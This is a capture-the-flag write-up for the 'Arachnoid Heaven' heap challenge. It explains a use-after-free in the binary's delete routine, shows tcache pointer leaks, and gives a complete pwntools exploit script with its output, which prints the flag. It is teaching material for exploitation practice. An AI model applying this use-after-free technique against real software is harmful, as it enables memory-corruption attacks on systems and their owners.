# Arachnoid Heaven

The description for this challenge is as follows:

*In the steam world, you need some trustworthy companions to help you continue your journey. What's better than a handmade, top-tier, state of the art arachnoid machine?! Exactly, nothing! Come to Arachnoid Heaven and craft yours as soon as possible?*

The challenge was rated at 1 out of 4 stars, and it was worth 325 points at the end with a total of 151 solves. It was fairly easy, although it does require some basic knowledge of heap pwn concepts. The only downloadable was the challenge binary itself.

**TL;DR Solution:** Notice that the pointers to heap chunks within the global structure aren't deleted when memory is freed, giving us a use-after-free vulnerability. Use this fact to overwrite the name and code chunks of a now-deleted arachnoid and print the flag with the obtain_arachnoid function.

## Gathering Information

When I run the binary, I see that we have four main options in a menu: "Craft arachnoid", "Delete arachnoid", "View arachnoid", and "Obtain arachnoid". I can create arachnoids with specific indexes, names of my choosing, and code values that seem to default to "bad".
```
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21$ ./arachnoid_heaven 
🕸️ 🕷️  Welcome to Arachnoid Heaven! 🕷️ 🕸️

     🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩
     🔩                        🔩
     🔩  1. Craft  arachnoid   🔩
     🔩  2. Delete arachnoid   🔩
     🔩  3. View   arachnoid   🔩
     🔩  4. Obtain arachnoid   🔩
     🔩  5. Exit               🔩
     🔩                        🔩
     🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩

> 1

Name: zero
Arachnoid Index: 0


     🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩
     🔩                        🔩
     🔩  1. Craft  arachnoid   🔩
     🔩  2. Delete arachnoid   🔩
     🔩  3. View   arachnoid   🔩
     🔩  4. Obtain arachnoid   🔩
     🔩  5. Exit               🔩
     🔩                        🔩
     🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩

> 3
Arachnoid 0:
Name: zero

Code: bad
```
When I decompile the code in Ghidra, the main function is straightforward in processing menu selections. The craft_arachnoid function allocates chunks of size 0x28 for the name and code; the name is filled with user input, and the code is filled with the contents of a global variable. Pointers to both chunks are placed in an array in global variables.
```
  input_name = (void **)malloc(0x10);
  allocated_code = malloc(0x28);
  *input_name = allocated_code;
  allocated_code = malloc(0x28);
  input_name[1] = allocated_code;
  printf("%s","\nName: ");
  read(0,*input_name,0x14);
  strcpy((char *)input_name[1],defaultCode);
  lVar1 = (long)(int)arachnoidCount;
  allocated_code = input_name[1];
  arachnoids[lVar1 * 0x10] = *input_name;
                    /* I have to overwrite this bit, possible by overwriting the defaultCode global
                        */
  arachnoids[lVar1 * 0x10 + 1] = allocated_code;
  printf("Arachnoid Index: %d\n\n",(ulong)arachnoidCount);
  arachnoidCount = arachnoidCount + 1;
```
I can also use the delete_arachnoid function to "delete" an arachnoid at an index of my choosing. Basically, this function will free the name and code chunks of that arachnoid, but it doesn't do anything about the pointers within the arachnoids global.
```
  printf("Index: ");
  read(0,index,2);
  uVar1 = atoi(index);
  lVar2 = (long)(int)uVar1;
  printf("Arachnoid %d:\n\nName: %s\nCode: %s\n",(ulong)uVar1,(void *)arachnoids[lVar2 * 0x10],
         arachnoids[lVar2 * 0x10 + 1]);
  if (((int)uVar1 < 0) || (arachnoidCount <= (int)uVar1)) {
    puts("Invalid Index!");
  }
  else {
    free((void *)arachnoids[lVar2 * 0x10]);
    free((void *)arachnoids[lVar2 * 0x10 + 1]);
  }
```
view_arachnoid prints off the contents of the name and code chunk pointed to by each index in the global array up to the last allocated index. No special consideration is made for "deleted" arachnoids.
```
  i = 0;
  while ((int)i < arachnoidCount) {

    printf("Arachnoid %d:\nName: %s\nCode: %s\n",(ulong)i,arachnoids[(long)(int)i * 0x10],
           arachnoids[(long)(int)i * 0x10 + 1]);
    i = i + 1;
  }
```
Finally, the obtain_arachnoid function sticks out as containing a win condition. Specifically, this occurs if we can get the first six characters of the code value to equal "sp1d3y", but we don't control this value during normal operations.
```
  puts("Arachnoid: ");
  read(0,my_index,2);
  numeric_index = atoi(my_index);
  if ((numeric_index < 0) || (arachnoidCount <= numeric_index)) {
    puts("Invalid Index!");
  }
  else {
    numeric_index = strncmp((char *)arachnoids[(long)numeric_index * 0x10 + 1],"sp1d3y",6);
    if (numeric_index == 0) {
      system("cat flag.txt");
    }
    else {
      puts("Unauthorised!");
    }
  }
```
## A Heap Leak Rabbit-Hole

So, in modern implementations such as Ubuntu 20, freed chunks of memory are stored in tcache bins. Chunks that are the same or similar in size are stored in the same bin in a singly-linked list. When a chunk is freed, the first sixteen bytes of that chunk are overwritten with metadata; the first eight bytes is an address pointing to the next chunk in the list; the next eight bytes are a key value that points to the beginning of the tcache structure.

Practically, in this context, we can easily print the values of these pointers to the terminal. Since "View arachnoid" prints strings in chunks regardless of allocation status, if I free arachnoids and do not allocate the same number of new arachnoids, the name and code values will be printed as the address of the next chunk in the tcache list. Here is a snippet of what it looks like; the order of frees was index 2, 1, 0:
```
 Arachnoid 0:
Name: p\xf3\xe94yU
Code: \xc0\xf2\xe94yU
Arachnoid 1:
Name: \xf0\xf3\xe94yU
Code: @\xf3\xe94yU
Arachnoid 2:
Name: 
Code: \xc0\xf3\xe94yU
```
Arachnoid 2's name is empty because it was the first chunk to get freed, so it is at the head of the list and does not point to anything else. If you have GDB GEF installed, you can also use "heap bins" to view the contents of your tcache bins and verify that their addresses seem to match up with the leaked next values.
```
gef➤  heap bins
─────────────────────────── Tcachebins for thread 1 ───────────────────────────
Tcachebins[idx=1, size=0x30] count=6  ←  Chunk(addr=0x557934e9f2f0, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x557934e9f2c0, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x557934e9f370, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x557934e9f340, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x557934e9f3f0, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x557934e9f3c0, size=0x30, flags=PREV_INUSE) 

```

Ultimately, these leaks were not helpful to solving the challenge, but I think that this is a great starting example of what you can potentially do with heap pwn.

## Writing the Exploit

A final piece of information makes solving this challenge very simple; at least with tcache, freed chunks are allocated on a last-in first-out basis. When you free an arachnoid, the last chunk to be freed is a code chunk. When you create one, the first chunk allocated is a name chunk. As a result, if you create an arachnoid after previously deleting one, the freed code chunk is overwritten with the name of your chosing, and since indexes to those freed chunks are never overwritten, you can effectively create arachnoid entries with a name of "bad" and a code value of your choosing. This lets us trigger the win condition on "Obtain arachnoid". Here is a simple pwntools script to implement this strategy, with a couple of extra views for illustrative purposes:
```
from pwn import *

#target = process('./arachnoid_heaven')

#pid = gdb.attach(target, "\nb *craft_arachnoid\nb *view_arachnoid\n set disassembly-flavor intel\ncontinue")

target = remote('64.227.38.214', 30311)

def craft_arachnoid(name):
	print(target.recvuntil(b'>'))
	target.sendline(b'1')
	print(target.recvuntil(b'Name:'))
	target.sendline(name)

def delete_arachnoid(index):
	print(target.recvuntil(b'>'))
	target.sendline(b'2')
	print(target.recvuntil(b'Index:'))
	target.sendline(index)
def view_arachnoid():
	print(target.recvuntil(b'>'))
	target.sendline(b'3')

def obtain_arachnoid(index):
	print(target.recvuntil(b'>'))
	target.sendline(b'4')
	print(target.recvuntil(b'Arachnoid:'))
	target.sendline(index)
	
craft_arachnoid(b'hello')

delete_arachnoid(b'0')
view_arachnoid()

craft_arachnoid(b'sp1d3y')

view_arachnoid()
obtain_arachnoid(b'0')

target.interactive()
```
And here is what it looks like when you run the script:
```
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21$ python3 arachnoid_writeup.py 
[+] Opening connection to 64.227.38.214 on port 30311: Done
b'\xf0\x9f\x95\xb8\xef\xb8\x8f \xf0\x9f\x95\xb7\xef\xb8\x8f  \x1b[1;6;34mWelcome to Arachnoid Heaven!\x1b[0m \xf0\x9f\x95\xb7\xef\xb8\x8f \xf0\x9f\x95\xb8\xef\xb8\x8f\n\n     \xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9                        \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  1. Craft  arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  2. Delete arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  3. View   arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  4. Obtain arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  5. Exit               \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9                        \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\n\n>'
b' \nName:'
b' Arachnoid Index: 0\n\n\n     \xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9                        \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  1. Craft  arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  2. Delete arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  3. View   arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  4. Obtain arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  5. Exit               \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9                        \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\n\n>'
b' Index:'
b' Arachnoid 0:\n\nName: hello\n\nCode: bad\n\n     \xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9                        \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  1. Craft  arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  2. Delete arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  3. View   arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  4. Obtain arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  5. Exit               \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9                        \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\n\n>'
b' Arachnoid 0:\nName: \nCode: \x80\x82\xe1\xac\x04V\n\n     \xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9                        \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  1. Craft  arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  2. Delete arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  3. View   arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  4. Obtain arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  5. Exit               \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9                        \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\n\n>'
b' \nName:'
b' Arachnoid Index: 1\n\n\n     \xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9                        \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  1. Craft  arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  2. Delete arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  3. View   arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  4. Obtain arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  5. Exit               \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9                        \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\n\n>'
b' Arachnoid 0:\nName: bad\nCode: sp1d3y\n\nArachnoid 1:\nName: sp1d3y\n\nCode: bad\n\n     \xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9                        \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  1. Craft  arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  2. Delete arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  3. View   arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  4. Obtain arachnoid   \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9  5. Exit               \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9                        \xf0\x9f\x94\xa9\n     \xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\xf0\x9f\x94\xa9\n\n>'
b' Arachnoid:'
[*] Switching to interactive mode
 
HTB{l3t_th3_4r4chn01ds_fr3333}

     🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩
     🔩                        🔩
     🔩  1. Craft  arachnoid   🔩
     🔩  2. Delete arachnoid   🔩
     🔩  3. View   arachnoid   🔩
     🔩  4. Obtain arachnoid   🔩
     🔩  5. Exit               🔩
     🔩                        🔩
     🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩

> $  
```
Thanks for reading!
